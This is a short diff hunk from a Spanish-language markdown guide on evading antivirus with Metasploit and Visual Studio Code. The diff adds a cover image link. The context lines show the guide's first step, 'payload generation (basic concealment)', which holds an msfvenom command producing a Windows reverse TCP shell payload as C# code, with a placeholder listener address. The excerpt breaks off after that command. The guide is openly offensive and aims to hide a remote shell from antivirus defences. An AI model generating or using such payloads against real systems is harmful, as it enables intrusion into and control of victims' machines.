@@ -2,6 +2,8 @@
 
 ### **Guía de Evasión de AV con Metasploit + Visual Studio Code**
 
+![image](https://github.com/90l3m0np13/JumpCode/blob/main/Portada.jpeg)
+
 #### **1. Generación del Payload (Ocultamiento Básico)**
 ```bash
 msfvenom --platform windows -p windows/shell/reverse_tcp LHOST=192.168.1.X LPORT=5555 -f csharp
